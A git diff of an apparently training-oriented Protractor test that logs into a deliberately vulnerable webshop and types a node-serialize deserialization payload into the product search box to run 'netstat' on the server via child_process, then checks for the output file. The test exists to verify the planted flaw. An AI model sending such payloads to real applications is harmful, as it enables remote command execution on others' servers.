@@ -1,32 +1,40 @@
 'use strict';
 const path = require('path');
+const HelperFunctions = require('../helperFunctions.js');
 const glob = require("glob");
-const HelperFunctions = require('./helperFunctions.js');
 
-describe('Deserialization - Deserialization Bug', () => {
+describe('Deserialization - Deserialization Bug', function () {
 
-    beforeEach(() => {
+    beforeEach(function () {
         HelperFunctions.login(browser, 'customer0', 'compass0');
     });
 
-    afterEach(() => {
+    afterEach(function () {
         HelperFunctions.logout(browser);
     });
 
-    describe('Try to run netstat command', () => {
+    describe('Environment Variable Check', function () {
+        it('should be on', function () {
+            if (process.env.NODE_RCE_SERIALIZATION !== 'ON' && process.env.NODE_RCE_SERIALIZATION !== 'on') {
+                fail("Environment Variable not set");
+            }
+        });
+    });
 
-        beforeEach(() => {
+    describe('Try to run netstat command', function () {
+
+        beforeEach(function() {
             browser.get(browser.params.webshop);
         });
 
-        it('should be successfully', () => {
+        it('should be successfully', function () {
             let fileName = 'deserializationBug.txt';
 
             //Fill form
             element(by.model('productSearch.searchValue')).sendKeys("_$$ND_FUNC$$_function (){require('child_process').exec('netstat>" + fileName + "'); }()");
             browser.actions().sendKeys(protractor.Key.ENTER).perform();
 
-            let filePath = '../../' + fileName;
+            let filePath = '../../../' + fileName;
 
             browser.driver.wait(() => {
                 let filesArray = glob.sync(path.join(__dirname, filePath));
